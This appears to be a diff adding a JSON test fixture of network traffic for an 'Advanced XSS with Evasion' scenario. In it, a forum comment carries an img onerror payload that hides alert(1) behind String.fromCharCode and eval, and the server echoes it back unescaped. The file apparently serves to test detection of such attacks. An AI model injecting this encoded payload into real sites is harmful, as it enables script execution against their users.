@@ -1,0 +1,26 @@
+{
+  "scenario": "Advanced XSS with Evasion",
+  "description": "XSS using event handlers and encoding",
+  "connections": [
+    {
+      "src_ip": "10.0.1.100",
+      "src_port": 45201,
+      "dst_ip": "forum.example.com",
+      "dst_port": 80,
+      "protocol": "tcp",
+      "app_protocol": "http",
+      "messages": [
+        {
+          "direction": "request",
+          "sender_ip": "10.0.1.100",
+          "raw_data": "POST /comment HTTP/1.1\r\nHost: forum.example.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 134\r\nReferer: http://forum.example.com/post/456\r\n\r\nname=researcher&email=test@security.com&comment=<img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">"
+        },
+        {
+          "direction": "response",
+          "sender_ip": "forum.example.com",
+          "raw_data": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 287\r\n\r\n<html><body><h2>Comment Posted</h2><div class='comment'><strong>researcher</strong>: <img src=x onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"></div></body></html>"
+        }
+      ]
+    }
+  ]
+}
